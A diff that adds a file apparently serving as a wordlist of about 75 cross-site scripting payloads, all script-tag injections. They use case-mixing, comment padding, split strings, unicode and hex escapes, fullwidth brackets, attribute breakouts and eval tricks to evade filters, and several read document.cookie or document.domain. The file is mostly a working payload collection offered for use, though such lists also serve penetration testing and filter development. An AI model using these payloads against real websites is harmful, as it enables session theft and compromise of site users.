@@ -1,0 +1,76 @@
+<script>alert(1234)</script>
+<ScripT>alert(1234)</ScRipT>
+"><script>alert(123)</script>
+'><script>alert(123)</script>
+--><script>alert(123)</script>
+><script>alert(123)</script>
+＜script＞alert(123)＜/script＞
+"><script>alert(123);</script x="
+'><script>alert(123);</script x='
+><script>alert(123);</script x=
+<script>’alert(1)’.replace(/.+/,eval)</script>
+"><script>alert(1)</script><"
+#<script>alert(1)</script>
+'`"//><script>alert(1)</script>
+<!<script>alert(1)</script>
+<!<script>alert(1)</script> “
+<%<!--'%><script>alert(1);</script -->
+<%<script>alert(1)</script>
+<scr'+'ipt>alert(1)</scr'+'ipt>
+<script /**/>/**/alert(1)/**/</script /**/
+<script>/&/-alert(1)</script>
+<script>alert(1)</script>
+<script>alert`1`</script>
+\<script\>alert(1)\<\/script\>
+“><script>alert(1);</script>
+<sCRipT>alert(1)</sCRiPt>
+<ScRiPt>alert(1)</sCriPt>
+#<ScRiPt>alert(1)</ScRiPt>#
+<ScRiPt>alert(1)</ScRiPt>
+<<SCRIPT>alert(1);//<</SCRIPT>
+*/</script>'>alert(1)/*<script/1='
+<script>alert(1)</script>.asp
+<script>alert(1)</script>.aspx
+<script>alert(1)</script>.htm
+<script>alert(1)</script>.html
+<script>alert(1)</script>.php
+'"><script>alert(2);</script>
+'>  <script>alert(2);</script>
+'>'+'><script>alert(2);</script>
+>"'><script>alert(2);</script>
+>'"><script>alert(2);</script>
+>'><script>alert(2);</script>
+'>'><SCript>alert(2);</script>
+<!<script>alert(4)</script>
+<script /**/>/**/alert(/AmoloHT/)/**/</script /**/
+<script>alert(/Chrome%20XSS%20filter%20bypass/);</script>
+%script%alert(CXSS¢)4/script%
+<script>alert&DiacriticalGrave;1&DiacriticalGrave;</script>
+"><<script>alert(document.cookie);//<</script>
+"><script>alert(document.cookie)</script>
+<script>alert(document[‘cookie’])</script>
+<s\Cr\ipt\>alert(document\.cookie)<\/s\Cr\ipt\>\;\/>
+'><scr'+'ipt>alert(document.cookie)</scr'+'ipt><b><!--
+#<script>alert(document.domain)</script>
+<!<script>alert(document.domain)</script>
+<script>alert(document.domain)</script>
+<=script>=alert("hacked")<=/scirpt>=
+"><script>alert(“hello”)</script>jnyf0
+<ScRipt>ALeRt("hi");</sCRipT>
+<script ,>alert()</script>
+>'>"><script>alert();</script>
+<Script>alert()</Script>
+<script>alert()</script>”/></style>
+<script ^__^>alert(String.fromCharCode(49))</script ^__^
+"><script>alert(String.fromCharCode(66, 108, 65, 99, 75, 73, 99, 101))</script>
+"><script>alert(String.fromCharCode(88,83,83))</script>
+<<SCRIPT>alert("test");//<</SCRIPT>
+<script>alert\u00281\u0029</script>
+<script>alert('\u0031')</script>
+<script>'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}</script>
+<script>'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}</script>	
+<script>alert(['X','S','S'].join(''))</script>
+<script>alert(“xss”)</script>
+"><script>alert('XSS')</script>
+<script>alert('XSS')</script>
+//*><ScRipt>alert(/XSS/)</ScriPT>
